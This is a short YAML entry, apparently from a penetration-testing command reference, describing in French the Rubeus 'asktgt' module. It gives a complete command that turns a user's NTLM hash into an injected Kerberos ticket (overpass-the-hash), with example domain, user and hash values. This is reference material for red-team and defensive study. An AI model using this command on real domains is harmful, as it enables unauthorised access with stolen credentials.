---
description: |
  Le module `asktgt` de Rubeus utilise le hash NTLM d'un utilisateur valide pour demander des tickets Kerberos, afin d'accéder à n'importe quel service ou machine où cet utilisateur a des permissions.

  Command Reference:

  	Domain: test.local

  	Username: john

  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7

command: |
  Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
items:
  - Hash
  - Username
services:
  - Kerberos
OS:
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
references:
  - https://github.com/GhostPack/Rubeus
  - https://github.com/GhostPack/Rubeus#asktgt
---
